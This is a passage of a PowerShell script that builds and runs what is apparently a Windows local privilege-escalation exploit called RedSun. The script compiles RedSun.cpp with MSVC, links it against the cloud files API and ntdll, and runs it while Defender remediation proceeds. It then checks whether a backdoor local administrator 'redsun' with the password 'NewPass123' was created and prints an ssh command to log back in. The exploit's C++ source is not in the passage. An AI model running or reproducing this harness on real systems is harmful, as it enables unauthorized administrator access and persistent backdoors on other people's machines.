    foreach ($r in $roots) {
        $bat = Get-ChildItem -Path $r -Recurse -Filter 'vcvars64.bat' -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($bat) { return $bat.FullName }
    }
    return $null
}

$vcvars = Find-VcVarsBat
if (-not $vcvars) { Die 'No MSVC install with vcvars64.bat found. Install VS Build Tools with "Desktop development with C++" + Windows SDK.' }
Info "MSVC: $vcvars"

# --- Compile ---
# vcvars64.bat tweaks INCLUDE/LIB/PATH in the cmd session it's called from. Those
# changes can't survive back into PowerShell, so we stage everything into a batch
# file that does `call vcvars64.bat` then `cl ...` inside the same cmd session.
$exePath  = Join-Path $OutDir 'RedSun.exe'
$buildBat = Join-Path $OutDir '_build.bat'
@"
@echo off
cd /d "$OutDir"
call "$vcvars" >nul
cl /nologo /EHsc /std:c++17 /DUNICODE /D_UNICODE /W0 RedSun.cpp /link CldApi.lib ntdll.lib synchronization.lib user32.lib advapi32.lib ole32.lib netapi32.lib
"@ | Set-Content -Path $buildBat -Encoding ASCII

Info 'Compiling...'
$out = & cmd.exe /c $buildBat 2>&1
$out | Where-Object { $_ -notmatch 'warning C4005|winnt\.h.*note: see previous|ntstatus\.h.*warning' } |
       ForEach-Object { Write-Host "    $_" }

if (-not (Test-Path $exePath)) { Die 'Compile failed — RedSun.exe not produced.' }

$info = Get-Item $exePath
$hash = (Get-FileHash $exePath -Algorithm SHA256).Hash
Info "Built: $($info.FullName)  ($($info.Length) bytes)"
Info "SHA256: $hash"

if (-not $KeepSource) {
    Remove-Item $srcPath                              -ErrorAction SilentlyContinue
    Remove-Item (Join-Path $OutDir 'RedSun.obj')      -ErrorAction SilentlyContinue
    Remove-Item $buildBat                             -ErrorAction SilentlyContinue
}

Write-Host ""
Info "Running $exePath (Defender remediation usually takes ~30s)..."
$runOut = & cmd.exe /c "`"$exePath`"" 2>&1
$runOut | ForEach-Object { Write-Host "    $_" }

Write-Host ""
$user = Get-LocalUser -Name redsun -ErrorAction SilentlyContinue
$inAdmins = $false
if ($user) {
    $inAdmins = [bool] (Get-LocalGroupMember -Group Administrators -ErrorAction SilentlyContinue |
                       Where-Object { $_.SID -eq $user.SID })
}

if ($user -and $inAdmins) {
    Info 'EoP succeeded. New local administrator:'
    Write-Host "      Name    : $($user.Name)"
    Write-Host "      SID     : $($user.SID)"
    Write-Host "      Enabled : $($user.Enabled)"
    Write-Host "      Password: NewPass123"
    Write-Host ""
    Info 'Administrators group members now:'
    Get-LocalGroupMember -Group Administrators | ForEach-Object { Write-Host "      $($_.Name)" }
    $ip = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
           Where-Object { $_.IPAddress -notmatch '^(127\.|169\.254\.)' } |
           Select-Object -First 1).IPAddress
    if ($ip) {
        Write-Host ""
        Info "Reconnect with:  ssh -i winvm_key redsun@$ip"
    }
} elseif ($user) {
    Warn "User 'redsun' exists but is NOT in Administrators."
    Write-Host "      Name : $($user.Name)"
    Write-Host "      SID  : $($user.SID)"
} else {
    Warn "User 'redsun' was not created."
    Warn 'Check Defender state:'
    Write-Host '    Get-MpComputerStatus | Select RealTimeProtectionEnabled, IsTamperProtected, AntivirusSignatureVersion'
}
